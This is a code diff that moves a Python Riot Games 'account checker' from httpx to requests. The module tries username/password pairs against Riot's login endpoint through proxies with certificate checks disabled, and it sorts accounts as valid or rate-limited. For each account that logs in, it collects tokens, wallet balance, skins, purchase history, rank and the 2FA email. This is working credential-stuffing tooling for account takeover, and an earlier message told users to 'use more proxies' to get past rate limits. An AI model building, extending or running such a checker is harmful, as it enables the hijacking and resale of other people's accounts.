@@ -1,20 +1,20 @@
-"""Riot Games authentication and data fetching."""
+"""Riot Games authentication and data fetching using requests."""
 
 from __future__ import annotations
 
-import json
-import re
-import ssl
 import warnings
 from urllib.parse import parse_qs, urlparse
 
-import httpx
+import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 from config import AUTH_URL, ENTITLEMENTS_URL, PLATFORM_MAP, USERINFO_URL
 from models import AccountResult
 
 # Suppress SSL warnings
 warnings.filterwarnings("ignore")
+requests.packages.urllib3.disable_warnings()
 
 _HEADERS = {
     "User-Agent": (
@@ -23,24 +23,22 @@ _HEADERS = {
     "Accept": "application/json",
     "Content-Type": "application/json",
     "Cache-Control": "no-cache",
-    "Accept-Encoding": "gzip, deflate, br",
 }
 
 
-def _build_client(proxy: str | None, timeout: int) -> httpx.Client:
-    # Create a permissive SSL context
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    ctx.set_ciphers("DEFAULT@SECLEVEL=1")
+def _build_session(proxy: str | None, timeout: int) -> requests.Session:
+    """Build a requests session with optional proxy."""
+    session = requests.Session()
+    session.headers.update(_HEADERS)
+    session.verify = False
 
-    return httpx.Client(
-        headers=_HEADERS.copy(),
-        timeout=httpx.Timeout(timeout, connect=timeout),
-        follow_redirects=False,
-        proxy=proxy,
-        verify=False,
-    )
+    if proxy:
+        session.proxies = {
+            "http": proxy,
+            "https": proxy,
+        }
+
+    return session
 
 
 def check_account(
@@ -53,8 +51,8 @@ def check_account(
     """Authenticate and fetch all account data."""
     result = AccountResult(username=username, password=password)
 
-    for attempt in range(2):  # Retry once on failure
-        client = _build_client(proxy, timeout)
+    for attempt in range(2):
+        session = _build_session(proxy, timeout)
         try:
             # Step 1: Initialize auth session (get cookies)
             init_body = {
@@ -64,10 +62,7 @@ def check_account(
                 "response_type": "token id_token",
                 "scope": "account openid",
             }
-            init_resp = client.post(AUTH_URL, json=init_body)
-
-            if verbose:
-                result.error_message = f"init:{init_resp.status_code}"
+            init_resp = session.post(AUTH_URL, json=init_body, timeout=timeout)
 
             if init_resp.status_code == 429:
                 result.status = "RATE_LIMITED"
@@ -78,7 +73,7 @@ def check_account(
                 result.status = "ERROR"
                 result.error_message = f"Init failed: HTTP {init_resp.status_code}"
                 if attempt == 0:
-                    client.close()
+                    session.close()
                     continue
                 return result
 
@@ -90,7 +85,7 @@ def check_account(
                 "remember": True,
                 "language": "en_US",
             }
-            resp = client.put(AUTH_URL, json=auth_body)
+            resp = session.put(AUTH_URL, json=auth_body, timeout=timeout)
 
             if resp.status_code == 429:
                 result.status = "RATE_LIMITED"
@@ -101,7 +96,7 @@ def check_account(
                 result.status = "ERROR"
                 result.error_message = f"Auth failed: HTTP {resp.status_code}"
                 if attempt == 0:
-                    client.close()
+                    session.close()
                     continue
                 return result
 
@@ -123,12 +118,12 @@ def check_account(
                     return result
 
                 result.status = "VALID"
-                _fetch_account_data(client, token, result)
+                _fetch_account_data(session, token, result, timeout)
                 return result
 
             elif resp_type == "multifactor":
                 result.status = "VALID"
-                _try_basic_info(client, data, result)
+                _try_basic_info(data, result)
                 return result
 
             elif resp_type == "auth" and "error" in data:
@@ -138,7 +133,7 @@ def check_account(
                     return result
                 elif error == "rate_limited":
                     result.status = "RATE_LIMITED"
-                    result.error_message = "Rate limited - use more proxies"
+                    result.error_message = "Rate limited"
                     return result
                 else:
                     result.status = "ERROR"
@@ -149,32 +144,38 @@ def check_account(
                 result.error_message = f"Unknown type: {resp_type} | {str(data)[:60]}"
                 return result
 
-        except httpx.TimeoutException:
-            result.status = "ERROR"
-            result.error_message = f"Timeout (proxy: {proxy or 'none'})"
-            if attempt == 0:
-                client.close()
-                continue
-        except httpx.ProxyError as e:
+        except requests.exceptions.ProxyError:
             result.status = "ERROR"
             result.error_message = f"Proxy dead: {proxy}"
             if attempt == 0:
-                client.close()
+                session.close()
                 continue
-        except httpx.ConnectError as e:
+        except requests.exceptions.ConnectTimeout:
             result.status = "ERROR"
-            result.error_message = f"Connection failed: {str(e)[:60]}"
+            result.error_message = f"Connect timeout (proxy: {proxy or 'none'})"
             if attempt == 0:
-                client.close()
+                session.close()
+                continue
+        except requests.exceptions.ReadTimeout:
+            result.status = "ERROR"
+            result.error_message = f"Read timeout (proxy: {proxy or 'none'})"
+            if attempt == 0:
+                session.close()
+                continue
+        except requests.exceptions.ConnectionError as e:
+            result.status = "ERROR"
+            result.error_message = f"Connection error: {str(e)[:60]}"
+            if attempt == 0:
+                session.close()
                 continue
         except Exception as e:
             result.status = "ERROR"
             result.error_message = f"{type(e).__name__}: {str(e)[:80]}"
             if attempt == 0:
-                client.close()
+                session.close()
                 continue
         finally:
-            client.close()
+            session.close()
 
     return result
 
@@ -190,13 +191,15 @@ def _extract_token(uri: str) -> str | None:
         return None
 
 
-def _fetch_account_data(client: httpx.Client, token: str, result: AccountResult):
+def _fetch_account_data(
+    session: requests.Session, token: str, result: AccountResult, timeout: int
+):
     """Fetch detailed account information using the access token."""
-    auth_header = {"Authorization": f"Bearer {token}"}
+    session.headers["Authorization"] = f"Bearer {token}"
 
     # Get user info (region, summoner name, etc.)
     try:
-        resp = client.get(USERINFO_URL, headers=auth_header)
+        resp = session.get(USERINFO_URL, timeout=timeout)
         if resp.status_code == 200:
             info = resp.json()
 
@@ -233,7 +236,7 @@ def _fetch_account_data(client: httpx.Client, token: str, result: AccountResult)
     # Get entitlement token
     entitlement_token = None
     try:
-        resp = client.post(ENTITLEMENTS_URL, headers=auth_header, json={})
+        resp = session.post(ENTITLEMENTS_URL, json={}, timeout=timeout)
         if resp.status_code == 200:
             entitlement_token = resp.json().get("entitlements_token")
     except Exception:
@@ -243,28 +246,25 @@ def _fetch_account_data(client: httpx.Client, token: str, result: AccountResult)
 
     # Get store/inventory data
     if platform and entitlement_token:
-        store_headers = {
-            **auth_header,
-            "X-Riot-Entitlements-JWT": entitlement_token,
-        }
-        _fetch_store_data(client, platform, store_headers, result)
-        _fetch_ranked_data(client, platform, store_headers, result)
+        session.headers["X-Riot-Entitlements-JWT"] = entitlement_token
+        _fetch_store_data(session, platform, result, timeout)
+        _fetch_ranked_data(session, platform, result, timeout)
 
 
 def _fetch_store_data(
-    client: httpx.Client,
+    session: requests.Session,
     platform: str,
-    headers: dict,
     result: AccountResult,
+    timeout: int,
 ):
     """Fetch store data: RP, BE, skins, champions."""
     region_lower = platform.lower()
 
     # Try wallet
     try:
-        resp = client.get(
+        resp = session.get(
             f"https://{region_lower}.store.leagueoflegends.com/storefront/v3/wallet",
-            headers=headers,
+            timeout=timeout,
         )
         if resp.status_code == 200:
             wallet = resp.json()
@@ -275,10 +275,10 @@ def _fetch_store_data(
 
     # Try purchase history for skins/champions
     try:
-        resp = client.get(
+        resp = session.get(
             f"https://{region_lower}.store.leagueoflegends.com"
             "/storefront/v3/history/purchase",
-            headers=headers,
+            timeout=timeout,
         )
         if resp.status_code == 200:
             inventory = resp.json()
@@ -300,10 +300,10 @@ def _fetch_store_data(
     # Fallback: misc view
     if result.skin_count == 0 and result.rp == 0:
         try:
-            resp = client.get(
+            resp = session.get(
                 f"https://{region_lower}.store.leagueoflegends.com"
                 "/storefront/v3/view/misc",
-                headers=headers,
+                timeout=timeout,
             )
             if resp.status_code == 200:
                 data = resp.json()
@@ -316,20 +316,20 @@ def _fetch_store_data(
 
 
 def _fetch_ranked_data(
-    client: httpx.Client,
+    session: requests.Session,
     platform: str,
-    headers: dict,
     result: AccountResult,
+    timeout: int,
 ):
     """Fetch ranked information and summoner level."""
     region_lower = platform.lower()
 
     # Ranked stats
     try:
-        resp = client.get(
+        resp = session.get(
             f"https://{region_lower}.ledge.leagueoflegends.com"
             "/leagues-ledge/v2/rankedStats/puuid",
-            headers=headers,
+            timeout=timeout,
         )
         if resp.status_code == 200:
             ranked = resp.json()
@@ -344,13 +344,13 @@ def _fetch_ranked_data(
     except Exception:
         pass
 
-    # Summoner level (if not already fetched from userinfo)
+    # Summoner level
     if result.level == 0:
         try:
-            resp = client.get(
+            resp = session.get(
                 f"https://{region_lower}.ledge.leagueoflegends.com"
                 "/summoner-ledge/v1/current",
-                headers=headers,
+                timeout=timeout,
             )
             if resp.status_code == 200:
                 summoner = resp.json()
@@ -361,7 +361,7 @@ def _fetch_ranked_data(
             pass
 
 
-def _try_basic_info(client: httpx.Client, data: dict, result: AccountResult):
+def _try_basic_info(data: dict, result: AccountResult):
     """Extract whatever info we can from a 2FA-gated response."""
     email = data.get("multifactor", {}).get("email", "")
     method = data.get("multifactor", {}).get("method", "")
